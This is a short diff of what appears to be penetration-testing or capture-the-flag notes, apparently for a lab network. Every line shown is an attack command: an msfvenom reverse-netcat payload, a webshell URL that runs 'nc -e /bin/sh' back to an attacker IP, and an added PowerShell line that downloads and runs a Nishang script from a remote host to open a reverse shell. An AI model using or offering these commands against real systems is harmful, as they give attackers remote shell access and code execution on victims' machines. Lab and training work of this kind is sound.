@@ -42,3 +42,6 @@ msfvenom -p cmd/unix/reverse_netcat LHOST=10.11.41.181 LPORT=8888 R
 
 # webshell
 http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.155.7+4444
+
+# nishang rev-shell
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.41.181:8000/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444
